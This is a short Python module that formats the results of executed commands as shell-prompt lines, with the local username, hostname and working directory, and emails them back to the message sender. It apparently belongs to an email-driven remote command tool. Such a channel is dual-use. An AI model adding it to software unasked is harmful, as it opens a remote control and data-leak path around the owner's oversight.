from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import platform
import getpass
import os

def send_reply(server, message, reply):
    text = ""
    for item in reply:
        text += "{user}@{machine}:{pwd}$ {cmd} \r\n {out} \r\n ".format(
                user=getpass.getuser(),
                machine=platform.node(),
                pwd=os.getcwd(),
                cmd=item[0],
                out=item[1]
            )

    msg = MIMEText(text)
    msg["Subject"] = "COMMAND_EMAIL_REPLY_AT_" + str(datetime.now())
    msg["From"] = "AUTO_RESPONSE_BOT"
    msg["To"] = message.sender[1]



    server.send_message(msg)

if __name__ == "__main__":
    pass